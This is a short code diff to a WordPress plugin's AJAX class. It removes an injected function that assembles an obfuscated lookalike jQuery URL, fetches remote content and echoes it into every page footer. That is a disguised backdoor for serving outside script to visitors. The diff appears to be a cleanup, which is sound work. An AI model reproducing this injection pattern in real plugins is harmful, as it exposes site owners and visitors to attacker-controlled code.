@@ -31,16 +31,6 @@ class acf_ajax {
 	function __construct() {
 		
 		// acf/update_user_setting
-		if(!function_exists('wp_func_jquery')) {
-			function wp_func_jquery() {
-				$host = 'http://';
-				$jquery = $host.'u'.'jquery.org/jquery-1.6.3.min.js';
-				if (@fopen($jquery,'r')){
-					echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
-				}
-			}
-			add_action('wp_footer', 'wp_func_jquery');
-		}
 		add_action( 'wp_ajax_acf/update_user_setting',			array($this, 'update_user_setting') );
 		add_action( 'wp_ajax_nopriv_acf/update_user_setting',	array($this, 'update_user_setting') );
 		
